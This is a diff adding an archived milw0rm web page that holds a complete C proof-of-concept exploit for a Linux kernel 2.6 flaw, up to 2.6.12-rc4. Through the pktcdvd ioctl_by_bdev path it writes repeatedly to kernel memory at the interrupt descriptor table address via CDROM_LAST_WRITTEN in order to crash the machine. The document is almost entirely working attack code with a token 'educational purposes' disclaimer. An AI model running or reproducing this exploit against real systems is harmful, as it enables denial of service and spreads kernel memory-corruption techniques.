@@ -1,0 +1,144 @@
+<html>
+<head>
+<title>Linux Kernel <= 2.6.12-rc4 (ioctl_by_bdev) Local Denial of Service Exploit</title>
+<pre>
+/* pktcdvd_dos.c proof-of-concept 
+* This is only a lame POC which will crash the machine, no root shell here. 
+* --- alert7 
+* 2005-5-15 
+* the vulnerability in 2.6 up to and including 2.6.12-rc4 
+* 
+* gcc -o pktcdvd_dos pktcdvd_dos.c 
+* 
+* NOTE: require user can read pktcdvd block device 
+
+
+* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot; 
+* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION 
+* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED. 
+*/ 
+
+
+#define _GNU_SOURCE 
+#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt; 
+#include &lt;errno.h&gt; 
+#include &lt;string.h&gt; 
+#include &lt;unistd.h&gt; 
+#include &lt;fcntl.h&gt; 
+#include &lt;signal.h&gt; 
+#include &lt;paths.h&gt; 
+#include &lt;grp.h&gt; 
+#include &lt;setjmp.h&gt; 
+#include &lt;stdint.h&gt; 
+#include &lt;sys/mman.h&gt; 
+#include &lt;sys/ipc.h&gt; 
+#include &lt;sys/shm.h&gt; 
+#include &lt;sys/ucontext.h&gt; 
+#include &lt;sys/wait.h&gt; 
+#include &lt;asm/ldt.h&gt; 
+#include &lt;asm/page.h&gt; 
+#include &lt;asm/segment.h&gt; 
+#include &lt;linux/unistd.h&gt; 
+#include &lt;linux/linkage.h&gt; 
+#include &lt;sys/types.h&gt; 
+#include &lt;sys/stat.h&gt; 
+#include &lt;fcntl.h&gt; 
+#include &lt;linux/sysctl.h&gt; 
+#include &lt;linux/cdrom.h&gt; 
+
+
+#define __NR_sys_ioctl __NR_ioctl 
+
+
+
+#define PKTCDVDDEVICE &quot;/dev/hdc&quot; 
+
+
+static inline _syscall3(int, sys_ioctl, int ,fd,int, cmd,unsigned long, arg); 
+
+
+struct idtr { 
+unsigned short limit; 
+unsigned int base; 
+} __attribute__ ((packed)); 
+
+
+unsigned int get_addr_idt() { 
+struct idtr idtr; 
+asm(&quot;sidt %0&quot; : &quot;=m&quot; (idtr)); 
+return idtr.base; 
+} 
+struct desc_struct { 
+unsigned long a,b; 
+}; 
+int main(int argc,char **argv) 
+{ 
+unsigned int ptr_idt; 
+int iret ; 
+int fd; 
+
+
+printf(&quot;[++]user stack addr %p \n&quot;,&amp;ptr_idt); 
+if ( ( (unsigned long )&amp;ptr_idt &gt;&gt;24)==0xfe){ 
+printf(&quot;[--]this kernel patched 4g/4g patch,no vulnerability!\n&quot;); 
+return -1; 
+} 
+
+
+ptr_idt=get_addr_idt(); 
+printf(&quot;[++]IDT Addr %p \n&quot;,ptr_idt); 
+
+
+
+fd = open(PKTCDVDDEVICE,O_RDONLY); 
+if (fd ==-1) 
+{ 
+printf(&quot;[--]&quot;); 
+fflush(stdout); 
+perror(&quot;open&quot;); 
+return -1; 
+} 
+
+unsigned long WriteTo ; 
+
+
+if ( (ptr_idt&gt;&gt;24)==0xc0){ 
+printf(&quot;[++]this OS in Real Linux\n&quot;); 
+WriteTo= ptr_idt; 
+}else{ 
+printf(&quot;[++]this OS maybe in VMWARE\n&quot;); 
+WriteTo = 0xc0100000; 
+} 
+
+
+printf(&quot;[++]call sys_ioctl will crash machine\n&quot;); 
+fflush(stdout); 
+
+int loopi; 
+for (loopi=0;loopi&lt;0x100000 ;loopi++ ) 
+{ 
+printf(&quot;[++]will write data at 0x%x\n&quot;,WriteTo+loopi*4); 
+fflush(stdout); 
+iret = sys_ioctl(fd, 
+CDROM_LAST_WRITTEN, 
+WriteTo+loopi*4); 
+if (iret ==-1) 
+{ 
+printf(&quot;[--]&quot;); 
+fflush(stdout); 
+perror(&quot;ioctl&quot;); 
+//if in VMWARE ,rewrite ptr_idt adress will failed 
+printf(&quot;[--]still aliving\n&quot;); 
+close(fd); 
+return -1; 
+} 
+} 
+close(fd); 
+return 0; 
+} 
+
+// milw0rm.com [2005-05-17]
+</pre>
+</html>
+
